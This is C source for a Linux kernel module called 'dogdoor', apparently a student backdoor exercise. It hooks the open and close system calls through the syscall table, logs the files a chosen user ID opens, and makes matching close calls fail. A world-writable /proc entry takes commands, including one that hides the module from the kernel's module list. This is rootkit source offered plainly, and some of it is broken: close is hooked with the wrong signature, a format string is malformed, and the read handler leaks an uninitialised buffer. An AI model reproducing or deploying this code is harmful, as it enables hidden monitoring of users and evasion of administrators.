#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>


MODULE_LICENSE("GPL");

struct list_head modules_list;
struct list_head* p;

//char line[128] = { 0x0, } ;
int index=0;
void ** sctable ;
int connect = 1;
int uid=-31;
char inName[512] = "-1";
char filepath[10][512];
int top =0;

asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
asmlinkage int (*orig_sys_close)(const char __user * filename, int flags, umode_t mode) ; 

asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
{
	char fname[512] ;
	copy_from_user(fname, filename,512) ;

	if(current->cred->uid.val == uid){
		top++;
		if(top>=10)	top = top%10;
		filepath[top][0] = '\0';
		strcpy(&filepath[top][0],fname);
	}
	

	return orig_sys_open(filename, flags, mode) ;
}

asmlinkage int dogdoor_sys_close(char *filename, int flags, int mode)
{	char fname[512] = "-1" ;
	copy_from_user(fname, filename,512) ;	

	printk("dogdoor sys close implemented");
	//copy from kernel to user
	//copy_from_user(pID, proID, 256);

	if(strcmp(fname, inName)==0) {
		printk("Compare complete");
		return -1;
	}
	else{
	return orig_sys_close(filename,flags,mode) ;
	}
}


static 
int dogdoor_proc_open(struct inode *inode, struct file *file) {
	return 0 ;
}

static 
int dogdoor_proc_release(struct inode *inode, struct file *file) {
	return 0 ;
}
static
ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[256] ;
	ssize_t toread ;
	

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;

	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT ;	

	*offset = *offset + toread ;

	return toread ;
}



static
void show_module(void){
	if(connect==0){
		list_add(&THIS_MODULE->list, p); 
		connect = 1;
		printk("connect\n");
	}	
	return;
}
static
void hide_module(void){
	if(connect==1){
		list_del_init(&THIS_MODULE->list); 
		connect = 0;
		printk("disconnect\n");
	}	
	return;
}



	
static
void show_log(void) 
{	int i=0;
	for(i=0; i<10; i++){
		printk("path : %s\n", &filepath[i][0]) ;
	}

}


static 
ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{

	/*printf("--1. input userid\n");
	printf("--2. get user log\n");
	printf("--3. make imortal process\n");
	printf("--4. make mortal process\n");
	printf("--5. hide module\n");
	printf("--6. show module\n");*/

	char buf[128] ;

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;
	
	sscanf(buf,"%d", &index) ;
	printk("index : %d\n", index);	
	if(index==1){
		sscanf(buf+1, "%d",&uid);
		printk("uid = %d\n",uid);
	}
	else if(index==2){
		show_log();
	}
	else if(index==3){
		printk("index completed");
		sscanf(buf+1, "s",inName);
	}	
	if(index==5){
		hide_module();
	}
	if(index==6){
		show_module();
	}
	
	*offset = strlen(buf) ;

	return *offset ;
}

static const struct file_operations dogdoor_fops = {
	.owner = 	THIS_MODULE,
	.open = 	dogdoor_proc_open,
	.read = 	dogdoor_proc_read,
	.write = 	dogdoor_proc_write,
	.llseek = 	seq_lseek,
	.release = 	dogdoor_proc_release,
} ;

static 
int __init dogdoor_init(void) {
	
	unsigned int level ; 
	pte_t * pte ;
	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;
	
  	modules_list = THIS_MODULE->list;
	p = (&modules_list)->prev;
	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

	orig_sys_open = sctable[__NR_open] ;
	orig_sys_close = sctable[__NR_close] ;
	pte = lookup_address((unsigned long) sctable, &level) ;
	if (pte->pte &~ _PAGE_RW) 
		pte->pte |= _PAGE_RW ;		
	sctable[__NR_open] = dogdoor_sys_open ;
	sctable[__NR_close] = dogdoor_sys_close ;

	return 0;
}

static 
void __exit dogdoor_exit(void) {
	unsigned int level ;
	pte_t * pte ;
	remove_proc_entry("dogdoor", NULL) ;
	
	sctable[__NR_open] = orig_sys_open ;
	sctable[__NR_close] = orig_sys_close ;
	pte = lookup_address((unsigned long) sctable, &level) ;
	pte->pte = pte->pte &~ _PAGE_RW ;
}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
